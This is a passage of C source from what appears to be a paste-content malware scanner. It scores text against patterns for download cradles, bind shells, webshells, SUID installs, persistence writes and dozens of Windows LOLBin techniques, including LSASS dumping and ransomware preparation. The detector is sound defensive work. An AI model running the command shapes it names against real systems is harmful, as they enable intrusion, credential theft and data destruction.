          strstr(text, "apt/preferences") || strstr(text, "apt.conf.d") ||
          strstr(text, "yum.repos.d") || strstr(text, "modprobe.d") ||
          strstr(text, "sysctl.d") || strstr(text, "polkit-1") ||
          strstr(text, "dbus-1") || strstr(text, "sudoers.d") ||
          strstr(text, "spool/cron") || strstr(text, "cron.d") ||
          strstr(text, "daemon.json") || strstr(text, ".git/hooks") ||
          strstr(text, ".gitmodules") || strstr(text, ".gitattributes") ||
          strstr(text, "known_hosts") || strstr(text, "profile.d") ||
          strstr(text, ".pam_environment") || strstr(text, "modules-load.d") ||
          strstr(text, "tmpfiles.d") || strstr(text, "binfmt.d") ||
          strstr(text, "hwdb.d") || strstr(text, "firewalld") ||
          strstr(text, "fail2ban") || strstr(text, "logrotate.d") ||
          strstr(text, "rsyslog.d") || strstr(text, "audit/rules.d") ||
          strstr(text, "auditd.conf") || strstr(text, "ld.so.preload") ||
          strstr(text, "fstab") || strstr(text, "crypttab") ||
          strstr(text, "exports") || strstr(text, "netgroup") ||
          strstr(text, "auto.master") || strstr(text, "hostapd") ||
          strstr(text, "wpa_supplicant") || strstr(text, "dhclient") ||
          strstr(text, "dhcpcd") || strstr(text, "netplan") ||
          strstr(text, "systemd/network") || strstr(text, "resolvconf") ||
          strstr(text, "hosts.allow") || strstr(text, "hosts.deny") ||
          strstr(text, "ipsec.conf") || strstr(text, "ppp/peers") ||
          strstr(text, "wireguard") || strstr(text, "wg0.conf") ||
          strstr(text, "openvpn") || strstr(text, "vtund") ||
          strstr(text, "dnsmasq") || strstr(text, "unbound.conf") ||
          strstr(text, "named.conf") || strstr(text, "msmtprc") ||
          strstr(text, "fetchmailrc") || strstr(text, "aliases") ||
          strstr(text, "mailname") || strstr(text, "main.cf") ||
          strstr(text, "master.cf") || strstr(text, "postfix") ||
          strstr(text, "dovecot") || strstr(text, "saslauthd") ||
          strstr(text, "opendkim") || strstr(text, ".bash_profile") ||
          strstr(text, ".ssh/rc") || strstr(text, ".xinitrc") ||
          strstr(text, ".xprofile") || strstr(text, ".xserverrc") ||
          strstr(text, ".pam.d") || strstr(text, "pam.d"))) ||
        ((strstr(text, "cp ") || strstr(text, "mv ") ||
          strstr(text, "install ")) &&
         (strstr(text, "cron.d") || strstr(text, "spool/cron") ||
          strstr(text, "systemd/system") || strstr(text, "inetd") ||
          strstr(text, "xinetd") || strstr(text, "init.d") ||
          strstr(text, "/etc/profile") || strstr(text, "profile.d") ||
          strstr(text, "ld.so") || strstr(text, "rc.local") ||
          strstr(text, "autostart") || strstr(text, "authorized_keys")))) {
        v.signals |= PASTE_PERSIST_WRITE;
        v.score += 45;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P11: Persistence write — appends/enables code to run "
                "on every login or boot");
    }

    /* P12: eval/exec of fetched content — the non-pipe form of the
     * download cradle (P2 only catches the `| sh` shape) */
    if ((strstr(text, "eval") || strstr(text, "exec") ||
         ci_contains(text, "source ") || ci_contains(text, ". /") ||
         strstr(text, "sh <(")) &&
        (strstr(text, "$(") || strstr(text, "`") ||
         strstr(text, "curl") || strstr(text, "wget") ||
         strstr(text, "fetch"))) {
        v.signals |= PASTE_EVAL_FETCH;
        v.score += 45;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P12: Eval/source of fetched content — same RCE class as "
                "the pipe-to-shell cradle without the pipe");
    }

    /* P12b: download-then-execute chaining — `curl x > s && bash s`,
     * `wget x; sh s`, `curl x && sudo bash s`. P2 needs a literal
     * `| sh` and P12 needs an eval/source verb; the `&&`/`;` exec
     * chain is the third shape of the same download cradle.       */
    if ((strstr(text, "curl ") || strstr(text, "wget ") ||
         strstr(text, "fetch ") || strstr(text, "lynx ") ||
         strstr(text, "scp ") || strstr(text, "sftp ") ||
         strstr(text, "rsync ") || strstr(text, "tftp ") ||
         strstr(text, "base64 -d") || strstr(text, "base64 -D") ||
         strstr(text, "base64 --decode") || strstr(text, "openssl enc") ||
         strstr(text, "openssl aes") || strstr(text, "gpg -d") ||
         strstr(text, "gpg --decrypt") || strstr(text, "xxd -r")) &&
        (strstr(text, "&& bash") || strstr(text, "&& sh") ||
         strstr(text, "&& chmod") || strstr(text, "&& sudo") ||
         strstr(text, "&& ./") || strstr(text, "&& /") ||
         strstr(text, "; bash") || strstr(text, "; sh") ||
         strstr(text, "; ./") ||
         strstr(text, "; chmod") || strstr(text, "; sudo") ||
         strstr(text, "; /"))) {
        v.signals |= PASTE_EVAL_FETCH;
        v.score += 45;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P12b: Download-then-execute chain — remote content "
                "fetched and run via &&/;");
    }

    /* P13: Listener / privilege-escalation one-liners — a bind shell,
     * a staging/exfil HTTP server, or a SUID bit install. These are
     * pastejacked post-exploitation verbs, not admin commands: nobody
     * needs `nc -l` or `chmod +s` in pasted content.            */
    if (strstr(text, "nc -l") || strstr(text, "ncat -l") ||
        strstr(text, "netcat -l") || strstr(text, " -lv") ||
        strstr(text, "ncat --listen") || strstr(text, "nc -p ")) {
        v.signals |= PASTE_LISTENER_PRIV;
        v.score += 45;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P13: Bind-shell listener — 'nc -l'/'ncat -l' opens a "
                "shell port for the attacker to connect back to");
    }
    if (strstr(text, "chmod +s") || strstr(text, "chmod u+s") ||
        strstr(text, "chmod 4") || strstr(text, "chmod 6") ||
        strstr(text, "setuid") || strstr(text, "u+s ")) {
        v.signals |= PASTE_LISTENER_PRIV;
        v.score += 55;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P13: SUID/setuid bit install — pasted privilege "
                "escalation primitive");
    }
    if ((strstr(text, "-m http.server") || strstr(text, "php -S ") ||
         strstr(text, "SimpleHTTPServer") || strstr(text, "busybox httpd") ||
         strstr(text, "-ehttpd")) &&
        (strstr(text, "python") || strstr(text, "php") ||
         strstr(text, "busybox") || strstr(text, "ruby") ||
         strstr(text, "-m "))) {
        v.signals |= PASTE_LISTENER_PRIV;
        v.score += 35;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P13: Ad-hoc HTTP server — staged payload hosting / "
                "loot-exfil listener");
    }

    /* P14: Webshell write — a script tag or web extension plus a request
     * superglobal plus an exec verb is unambiguous webshell vocabulary;
     * nobody pastes that benignly.                                   */
    if (((strstr(text, "<?php") || strstr(text, "<?=") ||
          strstr(text, "<%") || strstr(text, ".php") ||
          strstr(text, ".asp") || strstr(text, ".jsp") ||
          strstr(text, ".cgi") || strstr(text, ".war")) &&
         (strstr(text, "$_GET") || strstr(text, "$_POST") ||
          strstr(text, "$_REQUEST") || strstr(text, "$_COOKIE") ||
          strstr(text, "$_FILES") || strstr(text, "getParameter")) &&
         (strstr(text, "system(") || strstr(text, "eval(") ||
          strstr(text, "exec(") || strstr(text, "shell_exec(") ||
          strstr(text, "passthru(") || strstr(text, "assert(") ||
          strstr(text, "popen(") || strstr(text, "proc_open(") ||
          strstr(text, "getRuntime"))) ||
        ((strstr(text, "<%") || strstr(text, ".asp") ||
          strstr(text, ".aspx")) &&
         (strstr(text, "eval") || strstr(text, "exec")) &&
         strstr(text, "request")) ||
        (strstr(text, "getRuntime().exec") && strstr(text, ".jsp")) ||
        ci_contains(text, "<%eval") || ci_contains(text, "<% eval") ||
        ci_contains(text, "<%execute") || ci_contains(text, "<% execute") ||
        ci_contains(text, "<%createobject") || ci_contains(text, "<% createobject") ||
        ci_contains(text, "<%wscript") || ci_contains(text, "<% wscript")) {
        v.signals |= PASTE_EVAL_FETCH;
        v.score += 50;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P14: Webshell write — script tag/web ext + request "
                "input + exec verb (dropped web shell)");
    }

    /* P15: decode-then-pipe — `base64 -d | sh` / `openssl enc -d | sh`;
     * the decoder replaces the download side of the cradle (P2 needs a
     * fetch verb and P12 needs eval/source).                        */
    if ((strstr(text, "base64 -d") || strstr(text, "base64 -D") ||
         strstr(text, "base64 --decode") || strstr(text, "enc -d") ||
         strstr(text, "openssl enc") || strstr(text, "gpg -d") ||
         strstr(text, "gpg --decrypt")) &&
        (strstr(text, "| sh") || strstr(text, "|sh") ||
         strstr(text, "| bash") || strstr(text, "|bash") ||
         strstr(text, "| python") || strstr(text, "|python") ||
         strstr(text, "| perl") || strstr(text, "| node") ||
         strstr(text, "| pwsh") || strstr(text, "| powershell"))) {
        v.signals |= PASTE_EVAL_FETCH;
        v.score += 45;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "P15: Decode-then-pipe — base64/openssl decode piped "
                "to an interpreter");
    }

    /* P8: Windows "ClickFix" / LOLBin remote execution. ClickFix lures (fake
     * CAPTCHA or browser-update pages) tell the victim to press Win+R and
     * paste a one-liner that runs PowerShell or a living-off-the-land binary.
     * None of the Unix-centric checks above fire on these, yet ClickFix is the
     * dominant 2024-2025 initial-access technique. Matching is case-insensitive
     * and requires a download/exec qualifier so legitimate admin one-liners do
     * not trip it. */
    {
        const char *what = NULL;
        if (ci_contains(text, "powershell") &&
            (ci_contains(text, "-enc ")        || ci_contains(text, "encodedcommand") ||
             ci_contains(text, "downloadstring")|| ci_contains(text, "frombase64string") ||
             ci_contains(text, "iex")          || ci_contains(text, "invoke-expression") ||
             ci_contains(text, "-w hidden")    || ci_contains(text, "windowstyle hidden"))) {
            what = "PowerShell hidden/encoded/download-execute";
        } else if (ci_contains(text, "mshta") &&
                   (ci_contains(text, "http")  || ci_contains(text, "vbscript:") ||
                    ci_contains(text, "javascript:"))) {
            what = "mshta remote/script execution";
        } else if (ci_contains(text, "certutil") &&
                   (ci_contains(text, "urlcache") || ci_contains(text, "-decode"))) {
            what = "certutil download/decode (LOLBin)";
        } else if (ci_contains(text, "regsvr32") && ci_contains(text, "scrobj")) {
            what = "regsvr32 scrobj.dll (Squiblydoo)";
        } else if (ci_contains(text, "bitsadmin") && ci_contains(text, "/transfer")) {
            what = "bitsadmin remote file transfer (LOLBin)";
        } else if (ci_contains(text, "msiexec") && ci_contains(text, "http")) {
            what = "msiexec remote MSI install";
        } else if ((ci_contains(text, "wscript") || ci_contains(text, "cscript")) &&
                   (ci_contains(text, "http") || ci_contains(text, ".vbs") ||
                    ci_contains(text, ".js"))) {
            what = "wscript/cscript remote/script execution (LOLBin)";
        } else if (ci_contains(text, "wmic") &&
                   (ci_contains(text, "process call create") ||
                    ci_contains(text, "os get") )) {
            what = "wmic process creation (LOLBin)";
        } else if (ci_contains(text, "rundll32") &&
                   (ci_contains(text, "http") || ci_contains(text, "javascript"))) {
            what = "rundll32 remote/script execution (LOLBin)";
        } else if (ci_contains(text, "powershell") &&
                   (ci_contains(text, "invoke-restmethod") ||
                    ci_contains(text, "invoke-webrequest") ||
                    ci_contains(text, "iwr ") || ci_contains(text, "irm ") ||
                    ci_contains(text, "iwr\t") || ci_contains(text, "irm\t"))) {
            what = "PowerShell web download (iwr/irm)";
        } else if (ci_contains(text, "forfiles") &&
                   (ci_contains(text, "/p ") || ci_contains(text, "/m ")) &&
                   ci_contains(text, "/c ")) {
            what = "forfiles command execution (LOLBin)";
        } else if (ci_contains(text, "odbcconf") &&
                   (ci_contains(text, "regsvr") || ci_contains(text, "/a "))) {
            what = "odbcconf REGSVR execution (LOLBin)";
        } else if (ci_contains(text, "pcalua") &&
                   (ci_contains(text, "-a ") || ci_contains(text, "http") ||
                    ci_contains(text, "\\\\"))) {
            what = "pcalua program-launch LOLBin";
        } else if (ci_contains(text, "control.exe") &&
                   ci_contains(text, ".cpl")) {
            what = "control.exe CPL payload load";
        } else if (ci_contains(text, "esentutl") &&
                   ci_contains(text, "/y")) {
            what = "esentutl copy LOLBin (locked-file/ADS exfil)";
        } else if (ci_contains(text, "desktopimgdownldr") &&
                   ci_contains(text, "/lockscreenurl:")) {
            what = "desktopimgdownldr remote download (LOLBIN)";
        } else if (ci_contains(text, "syncappvpublishingserver") &&
                   ci_contains(text, "\";")) {
            what = "syncappvpublishingserver command injection (LOLBin)";
        } else if (ci_contains(text, "hh.exe") &&
                   (ci_contains(text, "http") || ci_contains(text, ".chm"))) {
            what = "hh.exe remote CHM execution (LOLBin)";
        } else if (ci_contains(text, "cmstp") && ci_contains(text, "/s")) {
            what = "cmstp INF-profile execution (LOLBin/UAC bypass)";
        } else if (ci_contains(text, "xwizard") ||
                   (ci_contains(text, "appvlp") &&
                    ci_contains(text, "http"))) {
            what = "xwizard/appvlp proxy execution (LOLBin)";
        } else if ((ci_contains(text, "cscript") ||
                    ci_contains(text, "wscript")) &&
                   ci_contains(text, "//e:")) {
            what = "script-engine extension bypass (//e: exec)";
        } else if (ci_contains(text, "ms-appinstaller:") ||
                   (ci_contains(text, "appinstaller") &&
                    ci_contains(text, "http"))) {
            what = "ms-appinstaller URI bypass (ClickFix 2025)";
        } else if (ci_contains(text, "osascript") &&
                   (ci_contains(text, "do shell script") ||
                    ci_contains(text, "http") ||
                    ci_contains(text, "curl ") || ci_contains(text, "bash"))) {
            what = "osascript AppleScript shell execution (macOS ClickFix)";
        } else if ((ci_contains(text, "python") || ci_contains(text, "python3")) &&
                   (ci_contains(text, "urllib") || ci_contains(text, "urllib2") ||
                    ci_contains(text, "urlopen") || ci_contains(text, "requests.get")) &&
                   (ci_contains(text, "exec(") || ci_contains(text, "eval(") ||
                    ci_contains(text, ".read()") || ci_contains(text, "subprocess"))) {
            what = "Python download-execute one-liner";
        } else if (ci_contains(text, "regasm") &&
                   (ci_contains(text, "http") || ci_contains(text, ".dll") ||
                    ci_contains(text, ".exe"))) {
            what = "regasm.exe .NET assembly execution (LOLBin)";
        } else if (ci_contains(text, "installutil") &&
                   (ci_contains(text, "http") || ci_contains(text, "/u ") ||
                    ci_contains(text, "/u\t"))) {
            what = "installutil.exe .NET AppDomain execution (LOLBin)";
        } else if (ci_contains(text, "regsvcs") &&
                   (ci_contains(text, "http") || ci_contains(text, ".dll") ||
                    ci_contains(text, ".exe"))) {
            what = "regsvcs.exe .NET assembly execution (LOLBin)";
        } else if (ci_contains(text, "msfvenom")) {
            what = "msfvenom payload generation (Metasploit)";
        } else if (ci_contains(text, "dnscmd") &&
                   ci_contains(text, "serverlevelplugindll")) {
            what = "dnscmd server-level plugin DLL load (DNS persistence)";
        } else if (ci_contains(text, "curl") &&
                   (ci_contains(text, "-t ") || ci_contains(text, "-t\t") ||
                    ci_contains(text, "--upload"))) {
            what = "curl file upload (data exfiltration channel)";
        } else if (ci_contains(text, "chisel") &&
                   (ci_contains(text, " client") ||
                    ci_contains(text, " server"))) {
            what = "chisel reverse tunnel (covert channel / LOLBin)";
        } else if (ci_contains(text, "msiexec") &&
                   (ci_contains(text, "/q") || ci_contains(text, "/quiet")) &&
                   ci_contains(text, "http")) {
            what = "msiexec silent remote MSI install (ClickFix)";
        } else if (ci_contains(text, "expand") &&
                   (ci_contains(text, "http") || ci_contains(text, "\\\\")) &&
                   ci_contains(text, "-f:")) {
            what = "expand.exe remote file download (LOLBin)";
        } else if (ci_contains(text, "curl") &&
                   (ci_contains(text, "-o ") || ci_contains(text, "--output ")) &&
                   (ci_contains(text, ".exe") || ci_contains(text, ".ps1") ||
                    ci_contains(text, ".dll") || ci_contains(text, ".bat"))) {
            what = "curl download of executable";
        } else if ((ci_contains(text, "wget") || ci_contains(text, "invoke-webrequest")) &&
                   (ci_contains(text, ".exe") || ci_contains(text, ".ps1") ||
                    ci_contains(text, ".dll") || ci_contains(text, ".bat"))) {
            what = "download of executable via wget/iwr";
        } else if ((ci_contains(text, "iwr ") || ci_contains(text, "irm ") ||
                    ci_contains(text, "iwr\t") || ci_contains(text, "irm\t") ||
                    ci_contains(text, "invoke-webrequest") ||
                    ci_contains(text, "invoke-restmethod")) &&
                   (ci_contains(text, "iex") ||
                    ci_contains(text, "invoke-expression") ||
                    ci_contains(text, "| iex"))) {
            what = "PowerShell download-execute cradle (iwr|iex)";
        } else if ((ci_contains(text, "pip install") ||
                    ci_contains(text, "pip3 install") ||
                    ci_contains(text, "pipx install") ||
                    ci_contains(text, "npm install") ||
                    ci_contains(text, "pnpm add") ||
                    ci_contains(text, "yarn add ") ||
                    ci_contains(text, "gem install ")) &&
                   (ci_contains(text, "--index-url") ||
                    ci_contains(text, "--extra-index-url") ||
                    ci_contains(text, "--registry") ||
                    ci_contains(text, "--source "))) {
            what = "alt-index package install (dependency-confusion channel)";
        } else if (ci_contains(text, "mpcmdrun") &&
                   (ci_contains(text, "-downloadfile") ||
                    ci_contains(text, "-url"))) {
            what = "mpcmdrun.exe file download (Defender LOLBin)";
        } else if (ci_contains(text, "odbcconf") &&
                   (ci_contains(text, "/f") || ci_contains(text, ".rsp") ||
                    ci_contains(text, "regsvr"))) {
            what = "odbcconf config-file DLL execution (LOLBin)";
        } else if (ci_contains(text, "ie4uinit") &&
                   (ci_contains(text, "-") || ci_contains(text, ".inf") ||
                    ci_contains(text, "basesettings"))) {
            what = "ie4uinit INF/settings execution (LOLBin)";
        } else if (ci_contains(text, "ieadvpack") &&
                   ci_contains(text, "/r")) {
            what = "ieadvpack INF execution (LOLBin)";
        } else if (ci_contains(text, "rasautou") &&
                   (ci_contains(text, "-f") || ci_contains(text, ".dll"))) {
            what = "rasautou RAS-dialer execution (LOLBin)";
        } else if (ci_contains(text, "mavinject") &&
                   (ci_contains(text, "injectrunning") ||
                    ci_contains(text, ".dll"))) {
            what = "mavinject.exe DLL injection (LOLBin)";
        } else if ((ci_contains(text, "expand") ||
                    ci_contains(text, "extrac32") ||
                    ci_contains(text, "diantz") ||
                    ci_contains(text, "extexport")) &&
                   (ci_contains(text, "http") || ci_contains(text, "\\\\"))) {
            what = "cabinet/extexport remote file pull (LOLBin)";
        } else if (ci_contains(text, "syncappvpublishingserver") &&
                   (ci_contains(text, "n;") || ci_contains(text, ";") ||
                    ci_contains(text, "cmd") || ci_contains(text, "powershell"))) {
            what = "SyncAppvPublishingServer sync-command execution (LOLBin)";
        } else if (ci_contains(text, "wbadmin") &&
                   (ci_contains(text, "-backuptarget:") ||
                    ci_contains(text, "\\\\"))) {
            what = "wbadmin backup exfiltration to remote share (LOLBin)";
        } else if (ci_contains(text, "finger") &&
                   ci_contains(text, "@")) {
            what = "finger remote data fetch (LOLBin channel)";
        } else if (ci_contains(text, "regini") &&
                   (ci_contains(text, ".ini") || ci_contains(text, "http"))) {
            what = "regini registry-script import (LOLBin)";
        /* Ransomware preparation classics — bcdedit disables recovery /
         * forces safeboot, wevtutil wipes the event logs, wusa installs
         * attacker .msu packages (documented Fin7 vector)              */
        } else if (ci_contains(text, "bcdedit") &&
                   (ci_contains(text, "/set") || ci_contains(text, "safeboot") ||
                    ci_contains(text, "recoveryenabled") ||
                    ci_contains(text, "bootstatuspolicy"))) {
            what = "bcdedit boot/recovery tampering (LOLBin)";
        } else if (ci_contains(text, "wevtutil") &&
                   (ci_contains(text, " cl ") || ci_contains(text, "clear-log") ||
                    ci_contains(text, " cl"))) {
            what = "wevtutil event-log clearing (anti-forensics)";
        } else if (ci_contains(text, "wusa") &&
                   ci_contains(text, ".msu")) {
            what = "wusa .msu package install (LOLBin)";
        /* netsh portproxy tunnels C2 through the host's own network
         * stack; cmdkey /add plants stored credentials for lateral
         * movement, /list enumerates them                            */
        } else if (ci_contains(text, "netsh") &&
                   ci_contains(text, "portproxy")) {
            what = "netsh portproxy tunnel (LOLBin)";
        } else if (ci_contains(text, "cmdkey") &&
                   (ci_contains(text, "/add") || ci_contains(text, "/list"))) {
            what = "cmdkey stored-credential planting/enumeration";
        /* dnscmd /serverlevelplugindll loads an arbitrary DLL into the
         * DNS service (documented persistence); /config disables WPAD
         * protections                                                  */
        } else if (ci_contains(text, "dnscmd") &&
                   (ci_contains(text, "plugin") || ci_contains(text, "/config"))) {
            what = "dnscmd server plugin/config abuse (LOLBin)";
        /* wsl -e/-c and bash -c execute payloads inside the WSL
         * subsystem where host EDR sees only a loader                */
        } else if (ci_contains(text, "wsl") &&
                   (ci_contains(text, "-e") || ci_contains(text, "-c") ||
                    ci_contains(text, ".sh") || ci_contains(text, "bash"))) {
            what = "wsl subsystem payload execution (LOLBin)";
        } else if (ci_contains(text, "certoc") &&
                   ci_contains(text, "-")) {
            what = "certoc certificate-store DLL loading (LOLBin)";
        /* Ransomware pre-encryption prep — icacls /deny locks admins
         * out before encryption, takeown /r takes recursive ownership,
         * cipher /w wipes free space, fsutil usn deletejournal and
         * wevtutil destroy the forensic record, manage-bde -off kills
         * BitLocker, diskpart /s runs scripted volume ops          */
        } else if (ci_contains(text, "icacls") &&
                   ci_contains(text, "/deny")) {
            what = "icacls deny-ACL lockout (ransomware prep)";
        } else if (ci_contains(text, "takeown") &&
                   (ci_contains(text, "/r") || ci_contains(text, " /d"))) {
            what = "takeown recursive ownership grab (ransomware prep)";
        } else if (ci_contains(text, "cipher") &&
                   ci_contains(text, "/w")) {
            what = "cipher free-space secure wipe (anti-forensics)";
        } else if (ci_contains(text, "fsutil") &&
                   ci_contains(text, "usn")) {
            what = "fsutil USN journal wipe (anti-forensics)";
        } else if (ci_contains(text, "manage-bde") &&
                   (ci_contains(text, "-off") || ci_contains(text, "-disable") ||
                    ci_contains(text, "-autounlock"))) {
            what = "manage-bde BitLocker disable (ransomware prep)";
        } else if (ci_contains(text, "diskpart") &&
                   ci_contains(text, "/s")) {
            what = "diskpart scripted volume operation (wiper class)";
        } else if (ci_contains(text, "secedit") &&
                   (ci_contains(text, "/configure") || ci_contains(text, "/import"))) {
            what = "secedit policy import (host-policy weakening)";
        } else if (ci_contains(text, "rasphone") &&
                   (ci_contains(text, "-d") || ci_contains(text, ".pbk"))) {
            what = "rasphone phonebook dial-out (LOLBin)";
        /* schtasks /create is ubiquitous legitimate admin — only the
         * privilege-escalated forms (/ru SYSTEM, /rl HIGHEST, /xml
         * import) are the documented attacker-persistence shape   */
        } else if (ci_contains(text, "schtasks") &&
                   ci_contains(text, "/create") &&
                   (ci_contains(text, "/ru") || ci_contains(text, "/rl") ||
                    ci_contains(text, "/xml"))) {
            what = "schtasks privileged task creation (persistence)";
        /* ntdsutil snapshot/ifm extracts ntds.dit — the domain
         * controller credential dump (the single highest-value
         * Windows LOLBin); pubprn/printui proxy-execute remote
         * scriptlets/driver DLLs, verclsid runs an arbitrary COM
         * CLSID, runonce /alternateshellstartup swaps the shell,
         * settingsynchost -load* embeds an executable payload   */
        } else if (ci_contains(text, "ntdsutil") &&
                   (ci_contains(text, "snapshot") || ci_contains(text, "ifm") ||
                    ci_contains(text, "create full") ||
                    ci_contains(text, "install from media") ||
                    ci_contains(text, "ac i ntds"))) {
            what = "ntdsutil ntds.dit extraction (credential dump)";
        } else if (ci_contains(text, "pubprn") &&
                   (ci_contains(text, "script:") || ci_contains(text, "http") ||
                    ci_contains(text, "\\\\"))) {
            what = "pubprn remote-script proxy execution (LOLBin)";
        } else if (ci_contains(text, "printui") &&
                   (ci_contains(text, "\\\\") || ci_contains(text, "http") ||
                    ci_contains(text, "/u"))) {
            what = "printui remote-driver DLL load (LOLBin)";
        } else if (ci_contains(text, "verclsid") &&
                   ci_contains(text, "/s")) {
            what = "verclsid arbitrary CLSID execution (LOLBin)";
        } else if (ci_contains(text, "runonce") &&
                   ci_contains(text, "alternateshellstartup")) {
            what = "runonce alternate-shell substitution (persistence)";
        } else if (ci_contains(text, "settingsynchost") &&
                   ci_contains(text, "-load")) {
            what = "settingsynchost embedded payload load (LOLBin)";
        /* sc create/config with binpath is the canonical service
         * persistence form; control + .cpl loads an arbitrary
         * Control Panel applet; findstr /v "" prints every line —
         * a whole-file read primitive hidden inside a grep      */
        } else if (ci_contains(text, "sc create") &&
                   (ci_contains(text, "binpath") || ci_contains(text, "obj"))) {
            what = "sc service creation (persistence primitive)";
        } else if (ci_contains(text, "sc config") &&
                   (ci_contains(text, "binpath") || ci_contains(text, "obj"))) {
            what = "sc service reconfig (persistence primitive)";
        } else if (ci_contains(text, "control") &&
                   ci_contains(text, ".cpl")) {
            what = "control applet load (.cpl payload)";
        } else if (ci_contains(text, "findstr") &&
                   ci_contains(text, "\"\"")) {
            what = "findstr whole-file read primitive (LOLBin)";
        /* LSASS memory dump — procdump/procdump64 and the
         * comsvcs.dll MiniDump rundll32 form are THE credential-
         * theft primitives (documented in nearly every intrusion) */
        } else if (ci_contains(text, "procdump") &&
                   (ci_contains(text, "lsass") || ci_contains(text, "-ma"))) {
            what = "procdump LSASS memory dump (credential theft)";
        } else if (ci_contains(text, "comsvcs") &&
                   ci_contains(text, "minidump")) {
            what = "comsvcs.dll MiniDump (LSASS credential theft)";
        /* tsecimp -f imports a TAPI XML that launches commands;
         * Microsoft.Workflow.Compiler compiles/executes XOML
         * workflow payloads (both LOLBAS-listed)                 */
        } else if (ci_contains(text, "tsecimp") &&
                   (ci_contains(text, "-f") || ci_contains(text, ".xml"))) {
            what = "tsecimp TAPI-XML payload execution (LOLBin)";
        } else if (ci_contains(text, "workflow.compiler") &&
                   (ci_contains(text, ".xoml") || ci_contains(text, ".cs") ||
                    ci_contains(text, ".xml"))) {
            what = "Workflow.Compiler XOML payload (LOLBin)";
        /* pnputil -i -a installs a driver package — the BYOVD
         * (bring-your-own-vulnerable-driver) primitive           */
        } else if (ci_contains(text, "pnputil") &&
                   (ci_contains(text, "-i") || ci_contains(text, "-a") ||
                    ci_contains(text, ".inf"))) {
            what = "pnputil driver install (BYOVD primitive)";
        /* net user/localgroup /add plants accounts, net share x=
         * exposes a drive, net use \\ leaks credentials to the
         * attacker share — the persistence/lateral account set   */
        /* net1.exe is the documented 'net' alias attackers run to
         * dodge 'net ' command monitoring — same primitives       */
        } else if ((ci_contains(text, "net user") ||
                    ci_contains(text, "net1 user") ||
                    ci_contains(text, "net.exe user")) &&
                   ci_contains(text, "/add")) {
            what = "net user account creation (backdoor primitive)";
        } else if ((ci_contains(text, "net localgroup") ||
                    ci_contains(text, "net1 localgroup") ||
                    ci_contains(text, "net.exe localgroup")) &&
                   ci_contains(text, "/add")) {
            what = "net localgroup admin grant (backdoor primitive)";
        } else if ((ci_contains(text, "net share") ||
                    ci_contains(text, "net1 share") ||
                    ci_contains(text, "net.exe share")) &&
                   ci_contains(text, "=")) {
            what = "net share drive exposure (exfil/lateral)";
        } else if ((ci_contains(text, "net use") ||
                    ci_contains(text, "net1 use") ||
                    ci_contains(text, "net.exe use")) &&
                   ci_contains(text, "\\\\")) {
            what = "net use remote-share mount (credential send)";
        /* ftp -s:script executes the embedded ! commands; iexpress
         * builds a self-extracting installer; robocopy to a UNC
         * destination is the classic bulk-exfil channel          */
        } else if (ci_contains(text, "ftp") &&
                   ci_contains(text, "-s:")) {
            what = "ftp script execution (LOLBin)";
        } else if (ci_contains(text, "iexpress") &&
                   (ci_contains(text, "-") || ci_contains(text, "/n") ||
                    ci_contains(text, ".sed"))) {
            what = "iexpress self-installer build (LOLBin)";
        } else if (ci_contains(text, "robocopy") &&
                   ci_contains(text, "\\\\")) {
            what = "robocopy exfiltration to remote share (LOLBin)";
        /* LOLBAS wave: ieexec fetches and runs a remote .NET app,
         * infdefaultinstall runs an .inf [DefaultInstall] payload,
         * msdeploy syncs attacker packages / runs commands        */
        } else if (ci_contains(text, "ieexec") &&
                   (ci_contains(text, "http") || ci_contains(text, ".exe") ||
                    ci_contains(text, ".dll"))) {
            what = "ieexec remote .NET execution (LOLBin)";
        } else if (ci_contains(text, "infdefaultinstall") &&
                   ci_contains(text, ".inf")) {
            what = "infdefaultinstall .inf payload (LOLBin)";
        } else if (ci_contains(text, "msdeploy") &&
                   (ci_contains(text, "-verb:") || ci_contains(text, "-source:") ||
                    ci_contains(text, "-dest:"))) {
            what = "msdeploy package/command execution (LOLBin)";
        /* rasdial /phonebook dials an attacker-supplied .pbk whose
         * entry can carry dial-up scripts (LOLBin)                */
        } else if (ci_contains(text, "rasdial") &&
                   (ci_contains(text, ".pbk") || ci_contains(text, "/phonebook"))) {
            what = "rasdial attacker phonebook dial (LOLBin)";
        /* regedit imports .reg (install primitive); '/e ' exports
         * instead, and exporting SAM/SECURITY/SYSTEM hives is
         * credential theft                                        */
        } else if (ci_contains(text, "regedit") &&
                   (ci_contains(text, "/s") ||
                    (ci_contains(text, ".reg") &&
                     !ci_contains(text, "/e ")))) {
            what = "regedit registry import (install primitive)";
        } else if (ci_contains(text, "regedit") &&
                   ci_contains(text, "/e") &&
                   (ci_contains(text, "\\sam") || ci_contains(text, "\\security") ||
                    ci_contains(text, "\\system"))) {
            what = "regedit SAM/SYSTEM hive export (credential theft)";
        /* reg add into autostart keys (Run/RunOnce/IFEO/
         * SilentProcessExit/Winlogon shell) is the classic
         * registry-persistence write                             */
        } else if ((ci_contains(text, "reg add") ||
                    ci_contains(text, "reg.exe add")) &&
                   (ci_contains(text, "currentversion\\run") ||
                    ci_contains(text, "image file execution") ||
                    ci_contains(text, "silentprocessexit") ||
                    ci_contains(text, "ms-settings") ||
                    (ci_contains(text, "winlogon") &&
                     (ci_contains(text, "shell") || ci_contains(text, "userinit"))))) {
            what = "reg add autostart/IFEO write (persistence primitive)";
        /* winrs -r runs a remote shell; tttracer/ttdinject trace
         * and inject DLLs via Time Travel Debugging (LOLBAS)      */
        } else if (ci_contains(text, "winrs") &&
